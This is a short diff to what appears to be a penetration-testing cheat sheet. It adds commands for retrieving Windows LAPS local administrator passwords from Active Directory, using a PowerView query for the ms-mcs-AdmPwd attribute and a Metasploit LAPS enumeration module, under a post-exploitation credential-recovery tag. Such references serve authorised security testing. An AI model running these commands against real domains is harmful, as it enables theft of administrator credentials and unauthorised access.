@@ -20,6 +20,16 @@ Import-Module .\LAPSToolkit.ps1
 Find-LAPSDelegatedGroups
 ```
 
+## powerview get laps password
+```powershell
+Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
+```
+
+## metasploit get laps password
+```
+use windows/gather/credentials/enum_laps
+```
+
 ## get all machine passwords
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
